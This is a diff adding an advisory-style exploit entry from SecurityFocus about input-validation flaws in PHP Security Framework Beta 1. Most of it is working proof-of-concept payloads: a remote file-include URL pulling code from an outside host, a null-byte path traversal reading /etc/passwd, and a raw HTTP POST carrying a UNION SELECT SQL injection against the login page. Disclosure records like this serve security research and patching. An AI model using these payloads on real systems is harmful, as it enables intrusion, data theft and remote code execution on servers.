@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/26898/info
+
+PHP Security Framework is prone to multiple input-validation vulnerabilities, including multiple SQL-injection issues and remote file-include issues.
+
+A successful exploit may allow an attacker to execute malicious code within the context of the webserver process, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+PHP Security Framework Beta 1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/PSF/lib/base.inc.php?MODEL_DIR=http://www.example2.com/
+http://www.example.com/PSF/lib/base.inc.php?DAO_DIR=/etc/passwd%00
+
+POST http://www.example.com/PSF/index.php?page=authentification HTTP/1.1\r\n
+Host: localhost\r\n
+Connection: keep-alive\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: <SIZE>\r\n\r\n
+username=8%27+union+select+CHR%2856%29%2CCHR%2857%29%2CCHR%2857%29%2CCHR%2857%29+FROM+psf_administrator-----------&password=9&page=authentification&button=Log+in\r\n\r\n
+
+SQL-query: select * from psf_administrator WHERE username='8\\\\\\\\\\\\\\\'union select CHR(56),CHR(57),CHR(57),CHR(57) FROM psf_administrator-----------' 
